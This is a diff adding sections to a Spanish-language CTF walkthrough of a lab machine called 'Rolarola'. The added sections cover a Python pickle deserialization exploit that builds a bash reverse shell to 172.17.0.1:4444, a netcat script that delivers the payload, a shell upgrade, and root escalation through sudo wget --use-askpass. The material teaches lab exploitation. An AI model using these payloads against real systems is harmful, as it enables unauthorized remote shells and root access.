@@ -342,6 +342,18 @@ Al ver que siempre está hay un servicio que lo ejecuta
 ![imagen_CTF](images/Rolarola/32.png)
 
 
+Tambien comprobamos si el puerto 6969 esta abierto:
+
+```bash
+netstat -tulnp
+```
+
+y paree que todo cuadra 
+
+
+![imagen_CTF](images/Rolarola/33.png)
+
+
 Así pues ahora si que nos vamos a centrar en el script, despues de investigar como un perro porque ando flojo descubro que tiene una vuln
 con pickle.loads(), la cosa es que al deserializar, python hace algo como `funcion(*argumentos)` entonces si en __reduce__ tú devuelves `return os.system, ("comando",)`
 python ejecuta `os.system("comando")` ...nada peligroso xD
@@ -431,11 +443,107 @@ Después de hacer unas pruebas y darme de cabezazos utilizando como base esta p�
 ```
 https://www.hackingarticles.in/python-serialization-vulnerabilities-pickle/
 ```
+ lo primero quehago e sun script con la carga maliciosa llamado `generador_codigo`
+
+ ```bash
+import pickle
+import os
+
+class Reverse_shell_atacante:
+    def __reduce__(self):
+        cmd = (
+            'bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &"'
+        )
+        return os.system, (cmd,)
+
+with open("payload.bin", "wb") as f:
+    f.write(pickle.dumps(Reverse_shell_atacante()))
+```
+
+los cambios respecto al de la pagina es quitar lo que no me valia y la modificacion para llamar a la reverse
+
+lo ejecuto con:
+
+```
+python3 generador_codigo
+```
+ y me crea payload.bin, que es donde está serializada la data, aquí es donde reside el problemilla que me encontré porque para enviar la data
+ no vale con poner el archivo tiene que ir en crudo y creo otro script para automatizar el envío llamado run.sh:
+
+ ```bash
+#!/bin/sh
+
+(
+  echo "2"; sleep 0.5   # Opción 2
+  echo "x"; sleep 0.5   # Nombre (da igual)
+  echo "1"; sleep 0.5   # Edad (da igual)
+  cat payload.bin       # Payload binario
+) | nc -q 1 127.0.0.1 6969
+```
+doy permisos de ejecución:
+
+```
+chmod +x run.sh
+```
+
+después me pongo en escuchar por el puerto 4444 en mi máquina atacante,
+
+![imagen_CTF](images/Rolarola/35.png)
+
+lanzo el script run.sh:
+
+```
+./run.sh
+```
+
+automatiza el envió de payload malicioso
+Después de que se ejecute vuelvo a llamar al programa app.py con nc
+
+```bash
+nc 127.0.0.1 6969
+```
+y elijo la opción 1 en el momento de elegirla, me hace la rev y ya soy matsi.
+
+![imagen_CTF](images/Rolarola/34.png)
+
+
+## ESCALANDO A ROOT
+
+Hacemos tratamiento de la tty:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+Ctrl+z para salir y dejarlo en segundo plano
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+stty rows 54 columns 235 en mi caso son estas las dimensiones con stty -a en una consola nueva puedes ver tus dimensiones
+```
+
+ Miramos si hay algo que podamos ejecutar con privilegios sudo:
+
+ ```bash
+sudo -l
+```
+```
+(ALL : ALL) NOPASSWD: /usr/bin/wget
+```
+
+![imagen_CTF](images/Rolarola/36.png)
 
 
 
+Nos vamos a `https://gtfobins.org/gtfobins/wget/` ya buscando el binario wget y vemos como explotarlo
+Seguimos los pasos adecuandolo un poco:
 
+```
+echo -e '#!/bin/sh\n/bin/sh 1>&0' >/tmp/temporal
+chmod +x /tmp/temporal
+sudo /usr/bin/wget --use-askpass=/tmp/temporal 0
+```
 
+![imagen_CTF](images/Rolarola/37.png)
 
 
 
